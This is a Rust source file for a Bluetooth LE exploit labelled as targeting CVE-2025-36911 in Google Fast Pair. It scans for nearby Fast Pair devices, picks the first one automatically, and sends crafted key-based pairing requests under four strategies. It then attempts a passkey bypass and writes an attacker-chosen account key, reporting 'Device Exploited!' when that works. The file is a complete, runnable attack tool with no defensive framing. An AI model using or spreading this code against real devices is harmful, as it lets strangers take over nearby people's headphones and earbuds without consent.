use anyhow::{anyhow, Result};
use btleplug::api::{Central, Manager as _, Peripheral as _, ScanFilter, WriteType};
use btleplug::platform::{Adapter, Manager, Peripheral};
use colored::*;
use rand::Rng;
use std::time::Duration;
use tokio::time;
use uuid::Uuid;
use aes::Aes128;
use cipher::{BlockEncrypt, KeyInit};
use cipher::generic_array::GenericArray;

// Fast Pair Service and Characteristics
const SERVICE_UUID: Uuid = Uuid::from_u128(0x0000fe2c_0000_1000_8000_00805f9b34fb);
const MODEL_ID_UUID: Uuid = Uuid::from_u128(0xfe2c1233_8366_4814_8eb0_01de32100bea);
const KEY_BASED_PAIRING_UUID: Uuid = Uuid::from_u128(0xfe2c1234_8366_4814_8eb0_01de32100bea);
const PASSKEY_UUID: Uuid = Uuid::from_u128(0xfe2c1235_8366_4814_8eb0_01de32100bea);
const ACCOUNT_KEY_UUID: Uuid = Uuid::from_u128(0xfe2c1236_8366_4814_8eb0_01de32100bea);

// Message types
const MSG_KEY_BASED_PAIRING_REQUEST: u8 = 0x00;

#[derive(Clone, Copy, Debug)]
enum ExploitStrategy {
    RawKbp,
    RawWithSeeker,
    Retroactive,
    ExtendedResponse,
}

pub async fn run(_target: &str) -> Result<()> {
    println!("{}", "=== Fast Pair (WPAir) Exploit ===".cyan().bold());
    println!("{}", "Exploits CVE-2025-36911 (Fast Pair 'Magic')".yellow());

    // Initialize manager
    let manager = Manager::new().await?;
    let adapters = manager.adapters().await?;
    let adapter = adapters.into_iter().next().ok_or_else(|| anyhow!("No Bluetooth adapters found"))?;

    // Scan
    let target_peripheral = scan_for_target(&adapter, 5).await?;
    
    // Connect
    println!("Connecting to {}...", target_peripheral.address());
    target_peripheral.connect().await?;
    target_peripheral.discover_services().await?;

    let strategies = [
        ExploitStrategy::RawKbp,
        ExploitStrategy::RawWithSeeker,
        ExploitStrategy::Retroactive,
        ExploitStrategy::ExtendedResponse
    ];
    
    // Seeker address (our address) - hardcoded dummy
    let seeker_address = vec![0x11, 0x22, 0x33, 0x44, 0x55, 0x66]; 

    for strategy in strategies {
        if execute_strategy(&target_peripheral, strategy, &seeker_address).await? {
            break;
        }
        time::sleep(Duration::from_millis(500)).await;
    }
    
    let _ = target_peripheral.disconnect().await;
    Ok(())
}

async fn scan_for_target(adapter: &Adapter, duration_secs: u64) -> Result<Peripheral> {
    println!("{}", "Starting BLE scan for Fast Pair devices...".blue());
    
    let filter = ScanFilter {
        services: vec![SERVICE_UUID],
    };
    adapter.start_scan(filter).await?;
    
    time::sleep(Duration::from_secs(duration_secs)).await;
    
    let peripherals = adapter.peripherals().await?;
    if peripherals.is_empty() {
        return Err(anyhow!("No Fast Pair devices found"));
    }

    println!("{}", "\nFound devices:".green().bold());
    let mut valid_peripherals = Vec::new();
    
    for (idx, p) in peripherals.iter().enumerate() {
        let properties = p.properties().await?;
        if let Some(props) = properties {
            let name = props.local_name.unwrap_or_else(|| "Unknown".to_string());
            let address = p.address();
            println!("{}: {} ({})", idx, name, address);
            valid_peripherals.push(p.clone());
        }
    }

    if valid_peripherals.is_empty() {
        return Err(anyhow!("No reachable devices found after scan"));
    }

    // Defaulting to first device for automation in this port
    println!("{}", "Selecting first device automatically...".yellow());
    Ok(valid_peripherals[0].clone()) 
}

fn aes_encrypt(key: &[u8], data: &[u8]) -> Vec<u8> {
    let key = GenericArray::from_slice(&key[0..16]);
    let mut block = GenericArray::clone_from_slice(&data[0..16]);
    let cipher = Aes128::new(key);
    cipher.encrypt_block(&mut block);
    block.to_vec()
}

fn build_kbp_request(strategy: ExploitStrategy, address_bytes: &[u8], seeker_address_bytes: &[u8]) -> (Vec<u8>, Vec<u8>) {
    let mut request = vec![0u8; 16];
    let mut shared_secret = vec![0u8; 16];
    let mut rng = rand::rng(); 

    match strategy {
        ExploitStrategy::RawKbp => {
            let salt: [u8; 8] = rng.random();
            request[0] = MSG_KEY_BASED_PAIRING_REQUEST;
            request[1] = 0x11;
            request[2..8].copy_from_slice(&address_bytes[0..6]);
            request[8..16].copy_from_slice(&salt);
            
            shared_secret[0..8].copy_from_slice(&salt);
        },
        ExploitStrategy::RawWithSeeker => {
            let salt: [u8; 2] = rng.random();
            request[0] = MSG_KEY_BASED_PAIRING_REQUEST;
            request[1] = 0x02; 
            request[2..8].copy_from_slice(&address_bytes[0..6]);
            request[8..14].copy_from_slice(&seeker_address_bytes[0..6]);
            request[14..16].copy_from_slice(&salt);
            
             let random_secret: [u8; 16] = rng.random();
             shared_secret.copy_from_slice(&random_secret);
        },
        ExploitStrategy::Retroactive => {
             let salt: [u8; 2] = rng.random();
             request[0] = MSG_KEY_BASED_PAIRING_REQUEST;
             request[1] = 0x0A;
             request[2..8].copy_from_slice(&address_bytes[0..6]);
             request[8..14].copy_from_slice(&seeker_address_bytes[0..6]);
             request[14..16].copy_from_slice(&salt);
             
             let random_secret: [u8; 16] = rng.random();
             shared_secret.copy_from_slice(&random_secret);
        },
        ExploitStrategy::ExtendedResponse => {
             let salt: [u8; 8] = rng.random();
             request[0] = MSG_KEY_BASED_PAIRING_REQUEST;
             request[1] = 0x10;
             request[2..8].copy_from_slice(&address_bytes[0..6]);
             request[8..16].copy_from_slice(&salt);
             
             shared_secret[0..8].copy_from_slice(&salt);
        }
    }

    (request, shared_secret)
}

async fn execute_strategy(peripheral: &Peripheral, strategy: ExploitStrategy, seeker_address: &[u8]) -> Result<bool> {
    let address = peripheral.address();
    let address_str = address.to_string();
    let address_bytes = mac_to_bytes(&address_str)?;

    let (request, shared_secret) = build_kbp_request(strategy, &address_bytes, seeker_address);
    
    println!("{}: {:?}", "Trying strategy".blue(), strategy);

    let chars = peripheral.characteristics();
    
    // Read Model ID to verify Fast Pair device
    if let Some(model_char) = chars.iter().find(|c| c.uuid == MODEL_ID_UUID) {
        println!("Found Model ID characteristic, reading...");
        if let Ok(model_data) = peripheral.read(model_char).await {
            println!("Model ID: {:02x?}", model_data);
        }
    }
    
    let kbp_char = chars.iter().find(|c| c.uuid == KEY_BASED_PAIRING_UUID).ok_or(anyhow!("KBP Char not found"))?;
    
    println!("Writing KBP request...");
    if let Err(e) = peripheral.write(kbp_char, &request, WriteType::WithoutResponse).await {
        println!("Write failed: {}", e);
        return Ok(false);
    }

    time::sleep(Duration::from_millis(500)).await;

    // Check for Passkey characteristic (used in some Fast Pair flows)
    if let Some(passkey_char) = chars.iter().find(|c| c.uuid == PASSKEY_UUID) {
        println!("Found Passkey characteristic, attempting passkey bypass...");
        // Send encrypted passkey response (0x02 = passkey seeker response)
        let mut passkey_block = vec![0u8; 16];
        passkey_block[0] = 0x02; // Passkey seeker message type
        let encrypted_passkey = aes_encrypt(&shared_secret, &passkey_block);
        let _ = peripheral.write(passkey_char, &encrypted_passkey, WriteType::WithoutResponse).await;
    }

    println!("Attempting to write Account Key...");
    let account_key_char = chars.iter().find(|c| c.uuid == ACCOUNT_KEY_UUID);
    
    if let Some(ak_char) = account_key_char {
        let mut account_key = vec![0u8; 16];
        account_key[0] = 0x04;
        let mut rng = rand::rng();
        rng.fill(&mut account_key[1..]);

        let encrypted_ak = aes_encrypt(&shared_secret, &account_key);
        
        if let Ok(_) = peripheral.write(ak_char, &encrypted_ak, WriteType::WithResponse).await {
            println!("{}", "Account Key Written Successfully! Device Exploited!".green().bold());
            return Ok(true);
        }
    }

    Ok(false)
}

fn mac_to_bytes(mac: &str) -> Result<Vec<u8>> {
    let bytes: Vec<u8> = mac.split(':')
        .map(|s| u8::from_str_radix(s, 16))
        .collect::<Result<Vec<_>, _>>()?;
    if bytes.len() != 6 {
        return Err(anyhow!("Invalid MAC address length"));
    }
    Ok(bytes)
}
